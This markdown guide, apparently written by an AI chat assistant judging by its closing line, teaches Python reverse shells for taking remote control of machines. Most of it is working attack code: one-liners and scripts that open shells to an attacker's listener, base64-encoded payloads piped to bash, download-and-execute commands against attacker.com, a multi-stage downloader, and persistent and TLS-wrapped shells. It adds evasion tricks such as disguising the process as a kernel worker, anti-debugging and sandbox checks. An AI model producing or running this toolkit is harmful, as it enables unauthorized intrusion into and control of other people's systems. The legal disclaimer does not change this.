# Python Reverse Shell Guide

> **‚ö†Ô∏è Legal & Ethical Notice**  
> This guide is for **authorized penetration testing and security research only**.  
> Unauthorized access to systems is illegal. Always obtain proper permissions.

---

## üöÄ Quick Start

### Basic One-Liner (Enhanced)
```bash
# Set your connection details
export RHOST="10.0.0.1"
export RPORT="4444"

# Execute the reverse shell
python3 -c 'import socket,subprocess,os,time; s=socket.socket(); s.settimeout(10); [s.connect((os.getenv("RHOST") or "127.0.0.1", int(os.getenv("RPORT") or 4444))) for _ in range(3) if not s.connect((os.getenv("RHOST") or "127.0.0.1", int(os.getenv("RPORT") or 4444))) or True]; [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call([os.getenv("SHELL","/bin/bash"),"-i"])'
```

### Listener Setup
```bash
# Start your listener first
nc -lvnp 4444

# Or with logging
nc -lvnp 4444 | tee session.log
```

---

## üìù Enhanced Python Reverse Shells

### 1. Basic Improved Version
```python
#!/usr/bin/env python3
import socket
import subprocess
import os

# Configuration
RHOST = os.getenv("RHOST", "127.0.0.1")  # Attacker IP
RPORT = int(os.getenv("RPORT", "4444"))   # Attacker Port

try:
    # Create socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    
    # Redirect stdin, stdout, stderr to socket
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    
    # Start interactive shell
    shell = os.getenv("SHELL", "/bin/bash")
    subprocess.call([shell, "-i"])
    
except Exception:
    pass
finally:
    s.close()
```

### 2. Advanced Multi-Connection Version
```python
#!/usr/bin/env python3
import socket
import subprocess
import os
import time
import threading

class ReverseShell:
    def __init__(self, host=None, port=None):
        self.host = host or os.getenv("RHOST", "127.0.0.1")
        self.port = int(port or os.getenv("RPORT", "4444"))
        self.backup_host = os.getenv("BACKUP_HOST", "")
        self.backup_port = int(os.getenv("BACKUP_PORT", "4445"))
        self.timeout = int(os.getenv("TIMEOUT", "10"))
        self.retry_count = int(os.getenv("RETRY_COUNT", "3"))
        self.retry_delay = int(os.getenv("RETRY_DELAY", "5"))
        
    def connect(self, host, port):
        """Attempt to connect to specified host and port"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((host, port))
            return s
        except Exception:
            return None
    
    def start_shell(self, sock):
        """Start interactive shell with socket redirection"""
        try:
            # Redirect file descriptors
            os.dup2(sock.fileno(), 0)  # stdin
            os.dup2(sock.fileno(), 1)  # stdout  
            os.dup2(sock.fileno(), 2)  # stderr
            
            # Determine shell to use
            shell = os.getenv("SHELL", "/bin/bash")
            if not os.path.exists(shell):
                shell = "/bin/sh"
            
            # Start interactive shell
            subprocess.call([shell, "-i"])
            
        except Exception:
            pass
        finally:
            sock.close()
    
    def run(self):
        """Main execution with retry logic"""
        sock = None
        
        # Try primary connection multiple times
        for attempt in range(self.retry_count):
            sock = self.connect(self.host, self.port)
            if sock:
                break
            time.sleep(self.retry_delay)
        
        # Try backup connection if primary fails
        if not sock and self.backup_host:
            for attempt in range(2):
                sock = self.connect(self.backup_host, self.backup_port)
                if sock:
                    break
                time.sleep(self.retry_delay)
        
        # Start shell if connection successful
        if sock:
            self.start_shell(sock)

# Execute
if __name__ == "__main__":
    shell = ReverseShell()
    shell.run()
```

### 3. Stealth Version with Obfuscation
```python
#!/usr/bin/env python3
import socket as s, subprocess as sp, os, time, base64

# Obfuscated configuration
config = {
    'h': base64.b64decode('MTI3LjAuMC4x').decode(),  # 127.0.0.1
    'p': int(base64.b64decode('NDQ0NA==').decode()),  # 4444
    't': 10,  # timeout
    'r': 3    # retries
}

def x():
    """Execute reverse shell with obfuscation"""
    try:
        # Get connection details from environment or config
        h = os.getenv('H') or config['h']
        p = int(os.getenv('P') or config['p'])
        
        # Connection attempts
        for _ in range(config['r']):
            try:
                c = s.socket()
                c.settimeout(config['t'])
                c.connect((h, p))
                
                # Redirect I/O
                [os.dup2(c.fileno(), fd) for fd in (0,1,2)]
                
                # Execute shell
                sp.call([os.getenv('S', '/bin/bash'), '-i'])
                break
                
            except:
                time.sleep(2)
                continue
    except:
        pass

# Stealth execution
if __name__ == '__main__':
    x()
```

### 4. Cross-Platform Version
```python
#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import time

class CrossPlatformShell:
    def __init__(self):
        self.host = os.getenv("RHOST", "127.0.0.1")
        self.port = int(os.getenv("RPORT", "4444"))
        self.is_windows = sys.platform.startswith('win')
        
    def get_shell(self):
        """Get appropriate shell for the platform"""
        if self.is_windows:
            return ["cmd.exe"]
        else:
            # Try different shells in order of preference
            shells = ["/bin/bash", "/bin/sh", "/bin/zsh", "/bin/dash"]
            for shell in shells:
                if os.path.exists(shell):
                    return [shell, "-i"]
            return ["/bin/sh", "-i"]  # fallback
    
    def connect_and_shell(self):
        """Connect and start shell"""
        try:
            # Create connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
            
            if self.is_windows:
                # Windows-specific handling
                import threading
                
                def send_input():
                    while True:
                        try:
                            data = s.recv(1024).decode()
                            if not data:
                                break
                            subprocess.run(data, shell=True, capture_output=False)
                        except:
                            break
                
                def send_output():
                    proc = subprocess.Popen(
                        self.get_shell(),
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        shell=True,
                        text=True
                    )
                    
                    while True:
                        try:
                            output = proc.stdout.read(1)
                            if output:
                                s.send(output.encode())
                        except:
                            break
                
                # Start threads for Windows
                threading.Thread(target=send_input, daemon=True).start()
                threading.Thread(target=send_output, daemon=True).start()
                
                # Keep connection alive
                while True:
                    time.sleep(1)
                    
            else:
                # Unix-like systems
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                subprocess.call(self.get_shell())
                
        except Exception as e:
            pass
        finally:
            try:
                s.close()
            except:
                pass

# Execute
if __name__ == "__main__":
    shell = CrossPlatformShell()
    shell.connect_and_shell()
```

---

## üîß One-Liner Variations

### Enhanced One-Liner (Recommended)
```python
# Multi-retry with environment variables
python3 -c 'import socket,subprocess,os,time; s=socket.socket(); [s.connect((os.getenv("RHOST","127.0.0.1"), int(os.getenv("RPORT","4444")))) for _ in range(3) if not any([s.settimeout(10), s.connect((os.getenv("RHOST","127.0.0.1"), int(os.getenv("RPORT","4444"))))])]; [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call([os.getenv("SHELL","/bin/bash"),"-i"])'
```

### Simplified Clean Version
```python
# Basic but reliable
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((os.getenv("RHOST","127.0.0.1"), int(os.getenv("RPORT","4444")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call([os.getenv("SHELL","/bin/bash"),"-i"])'
```

### Stealth One-Liner
```python
# Minimal and obfuscated
python3 -c 'import socket as s,subprocess as p,os;c=s.socket();c.connect((os.getenv("H","127.0.0.1"),int(os.getenv("P","4444"))));[os.dup2(c.fileno(),f)for f in(0,1,2)];p.call(["/bin/sh","-i"])'
```

### Base64 Encoded One-Liner
```bash
# Generate base64 payload
echo 'python3 -c "import socket,subprocess,os; s=socket.socket(); s.connect((\"127.0.0.1\", 4444)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call([\"/bin/bash\",\"-i\"])"' | base64

# Execute encoded payload
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOyBzPXNvY2tldC5zb2NrZXQoKTsgcy5jb25uZWN0KCgoXCIxMjcuMC4wLjFcIiwgNDQ0NCkpOyBbb3MuZHVwMihzLmZpbGVubygpLGZkKSBmb3IgZmQgaW4gKDAsMSwyKV07IHN1YnByb2Nlc3MuY2FsbChbXCIvYmluL2Jhc2hcIixcIi1pXCJdKSIK' | base64 -d | bash
```

---

## üåê Deployment Methods

### 1. Environment Variable Configuration
```bash
# Set connection parameters
export RHOST="192.168.1.100"
export RPORT="4444"
export SHELL="/bin/zsh"
export RETRY_COUNT="5"
export TIMEOUT="15"

# Execute shell
python3 reverse_shell.py

# Clean up environment
unset RHOST RPORT SHELL RETRY_COUNT TIMEOUT
```

### 2. Command Line Arguments
```python
#!/usr/bin/env python3
import sys
import socket
import subprocess
import os

if len(sys.argv) != 3:
    print("Usage: python3 shell.py <host> <port>")
    sys.exit(1)

host, port = sys.argv[1], int(sys.argv[2])

try:
    s = socket.socket()
    s.connect((host, port))
    [os.dup2(s.fileno(), fd) for fd in (0,1,2)]
    subprocess.call(["/bin/bash", "-i"])
except:
    pass
```

### 3. Configuration File
```python
#!/usr/bin/env python3
import json
import socket
import subprocess
import os

# Load config from file
try:
    with open('.config.json', 'r') as f:
        config = json.load(f)
except:
    config = {"host": "127.0.0.1", "port": 4444}

try:
    s = socket.socket()
    s.connect((config['host'], config['port']))
    [os.dup2(s.fileno(), fd) for fd in (0,1,2)]
    subprocess.call(["/bin/bash", "-i"])
except:
    pass
```

### 4. HTTP Download and Execute
```bash
# Host the shell script on your server
# Then execute remotely:
curl -s http://attacker.com/shell.py | python3

# Or with wget:
wget -qO- http://attacker.com/shell.py | python3

# With parameters:
curl -s http://attacker.com/shell.py | RHOST=10.0.0.1 RPORT=4444 python3
```

---

## üîí Advanced Features

### 1. SSL/TLS Encrypted Shell
```python
#!/usr/bin/env python3
import socket
import ssl
import subprocess
import os

def ssl_shell():
    host = os.getenv("RHOST", "127.0.0.1")
    port = int(os.getenv("RPORT", "4444"))
    
    try:
        # Create SSL context
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        # Create socket and wrap with SSL
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_sock = context.wrap_socket(sock)
        ssl_sock.connect((host, port))
        
        # Redirect I/O
        [os.dup2(ssl_sock.fileno(), fd) for fd in (0,1,2)]
        subprocess.call(["/bin/bash", "-i"])
        
    except Exception:
        pass

if __name__ == "__main__":
    ssl_shell()
```

### 2. Persistent Reconnection
```python
#!/usr/bin/env python3
import socket
import subprocess
import os
import time
import random

def persistent_shell():
    host = os.getenv("RHOST", "127.0.0.1")
    port = int(os.getenv("RPORT", "4444"))
    
    while True:
        try:
            s = socket.socket()
            s.settimeout(10)
            s.connect((host, port))
            
            [os.dup2(s.fileno(), fd) for fd in (0,1,2)]
            subprocess.call(["/bin/bash", "-i"])
            
        except Exception:
            # Random delay to avoid detection
            time.sleep(random.randint(30, 300))
            continue
        finally:
            try:
                s.close()
            except:
                pass

if __name__ == "__main__":
    persistent_shell()
```

### 3. Multi-Handler Support
```python
#!/usr/bin/env python3
import socket
import subprocess
import os
import threading
import time

class MultiHandler:
    def __init__(self):
        self.handlers = [
            ("127.0.0.1", 4444),
            ("127.0.0.1", 4445),
            ("backup.server.com", 443)
        ]
    
    def try_connect(self, host, port):
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((host, port))
            
            [os.dup2(s.fileno(), fd) for fd in (0,1,2)]
            subprocess.call(["/bin/bash", "-i"])
            return True
        except:
            return False
    
    def run(self):
        for host, port in self.handlers:
            if self.try_connect(host, port):
                break
            time.sleep(2)

if __name__ == "__main__":
    handler = MultiHandler()
    handler.run()
```

---

## üéØ Listener Setup Options

### 1. Basic Netcat Listeners
```bash
# Standard listener
nc -lvnp 4444

# With logging
nc -lvnp 4444 | tee -a session.log

# Persistent listener (auto-restart)
while true; do nc -lvnp 4444; done

# Multiple listeners
for port in 4444 4445 4446; do
    nc -lvnp $port &
done
```

### 2. SSL/TLS Listeners
```bash
# Generate certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/C=US/ST=State/L=City/O=Org/CN=localhost"

# SSL listener with OpenSSL
openssl s_server -quiet -accept 4444 -cert cert.pem -key key.pem

# SSL listener with socat
socat OPENSSL-LISTEN:4444,cert=cert.pem,key=key.pem,verify=0,fork EXEC:/bin/bash
```

### 3. Advanced Socat Listeners
```bash
# Basic socat listener
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# With logging
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,logfile=session.log

# Encrypted with password
socat OPENSSL-LISTEN:4444,cert=cert.pem,key=key.pem,verify=0 EXEC:/bin/bash
```

### 4. Python Listener
```python
#!/usr/bin/env python3
import socket
import threading

def handle_client(conn, addr):
    print(f"Connection from {addr}")
    try:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            print(data.decode(), end='')
    except:
        pass
    finally:
        conn.close()

def start_listener(port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    
    print(f"Listening on port {port}")
    
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()

if __name__ == "__main__":
    start_listener()
```

---

## üõ°Ô∏è Evasion Techniques

### 1. Process Hiding
```python
#!/usr/bin/env python3
import os
import sys

# Change process name (Linux)
try:
    import ctypes
    libc = ctypes.CDLL("libc.so.6")
    libc.prctl(15, b"[kworker/0:1]", 0, 0, 0)  # PR_SET_NAME
except:
    pass

# Your shell code here
import socket, subprocess
# ... rest of shell code
```

### 2. Anti-Debugging
```python
#!/usr/bin/env python3
import os
import sys

# Check for debugging
def anti_debug():
    # Check for common debugger processes
    debuggers = ['gdb', 'strace', 'ltrace', 'ptrace']
    
    try:
        with open('/proc/self/status', 'r') as f:
            status = f.read()
            if 'TracerPid:\t0' not in status:
                sys.exit(0)  # Being traced, exit
    except:
        pass
    
    # Check for debugger environment variables
    debug_vars = ['PYTHONDEBUG', 'PYTHONINSPECT']
    for var in debug_vars:
        if os.getenv(var):
            sys.exit(0)

# Run anti-debug check
anti_debug()

# Your shell code here
```

### 3. Timing-Based Evasion
```python
#!/usr/bin/env python3
import time
import random

# Random delay before execution
delay = random.randint(10, 300)  # 10 seconds to 5 minutes
time.sleep(delay)

# Check execution time (sandbox detection)
start_time = time.time()
time.sleep(1)
if time.time() - start_time < 0.9:  # Time skipped, likely sandbox
    exit(0)

# Your shell code here
```

---

## üí° Pro Tips & Best Practices

### 1. Environment Setup
```bash
# Create reusable environment file
cat > ~/.shell_env << 'EOF'
export RHOST="your.server.com"
export RPORT="443"
export SHELL="/bin/bash"
export TIMEOUT="30"
export RETRY_COUNT="5"
EOF

# Source when needed
source ~/.shell_env && python3 -c 'your_oneliner_here'

# Clean up
rm ~/.shell_env
```

### 2. Payload Delivery
```bash
# Method 1: Base64 encoding
PAYLOAD='python3 -c "import socket,subprocess,os; s=socket.socket(); s.connect((\"127.0.0.1\", 4444)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call([\"/bin/bash\",\"-i\"])"'
echo $PAYLOAD | base64 -w 0

# Method 2: URL encoding
python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))"

# Method 3: Hex encoding
echo -n "$PAYLOAD" | xxd -p | tr -d '\n'
```

### 3. Connection Stability
```python
# Add to your shell for better stability
import signal
import sys

def signal_handler(sig, frame):
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# Keep connection alive
def keep_alive(sock):
    import threading
    import time
    
    def heartbeat():
        while True:
            try:
                sock.send(b'\x00')  # Send null byte
                time.sleep(30)
            except:
                break
    
    threading.Thread(target=heartbeat, daemon=True).start()
```

### 4. Multi-Stage Deployment
```python
# Stage 1: Minimal downloader
python3 -c "import urllib.request; exec(urllib.request.urlopen('http://your.server/stage2.py').read())"

# Stage 2: Full-featured shell (hosted remotely)
# This keeps the initial payload small and flexible
```

---

## üîç Troubleshooting

### Common Issues and Solutions

| Issue | Cause | Solution |
|-------|-------|----------|
| Connection refused | Listener not running | Start listener first: `nc -lvnp 4444` |
| Permission denied | Firewall blocking | Try different ports (80, 443, 53) |
| Shell dies immediately | Process killed | Add persistence/reconnection logic |
| No output visible | Buffering issues | Use `python3 -u` for unbuffered output |
| Import errors | Missing modules | Use only standard library modules |
| Encoding issues | Character set problems | Add `# -*- coding: utf-8 -*-` |

### Debug Mode
```python
#!/usr/bin/env python3
import socket
import subprocess
import os
import sys

DEBUG = os.getenv('DEBUG', False)

def debug_print(msg):
    if DEBUG:
        print(f"[DEBUG] {msg}", file=sys.stderr)

def reverse_shell():
    host = os.getenv("RHOST", "127.0.0.1")
    port = int(os.getenv("RPORT", "4444"))
    
    debug_print(f"Connecting to {host}:{port}")
    
    try:
        s = socket.socket()
        s.settimeout(10)
        s.connect((host, port))
        debug_print("Connected successfully")
        
        [os.dup2(s.fileno(), fd) for fd in (0,1,2)]
        subprocess.call(["/bin/bash", "-i"])
        
    except Exception as e:
        debug_print(f"Error: {e}")

if __name__ == "__main__":
    reverse_shell()
```

---

## üìö Quick Reference

### Essential One-Liners
```bash
# Basic
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("127.0.0.1", 4444)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call(["/bin/bash","-i"])'

# With environment variables
RHOST=10.0.0.1 RPORT=4444 python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((os.getenv("RHOST"), int(os.getenv("RPORT")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call(["/bin/bash","-i"])'

# Multi-retry
python3 -c 'import socket,subprocess,os,time; [exec("s=socket.socket(); s.settimeout(5); s.connect((\"127.0.0.1\", 4444)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call([\"/bin/bash\",\"-i\"])") for _ in range(3) if not locals().get("connected")]'

# Stealth
python3 -c 'import socket as s,subprocess as p,os;c=s.socket();c.connect(("127.0.0.1",4444));[os.dup2(c.fileno(),f)for f in(0,1,2)];p.call(["/bin/sh","-i"])'
```

### Port Recommendations
| Port | Service | Stealth Level |
|------|---------|---------------|
| 80 | HTTP | High |
| 443 | HTTPS | High |
| 53 | DNS | High |
| 22 | SSH | Medium |
| 21 | FTP | Medium |
| 25 | SMTP | Medium |
| 4444 | Default | Low |
| 1337 | Leet | Low |

---

**üìÖ Updated**: December 2024 | **üë§ Author**: Security Researcher | **‚öñÔ∏è Legal Notice**: For authorized testing only

> **üõ°Ô∏è Ethical Hacking Reminder**: This guide is for educational purposes and authorized penetration testing only. Always obtain proper written permission before testing systems you don't own.
```

This comprehensive Python reverse shell guide provides everything from basic one-liners to advanced multi-stage deployments, with extensive explanations and practical examples! üêçüöÄ
```
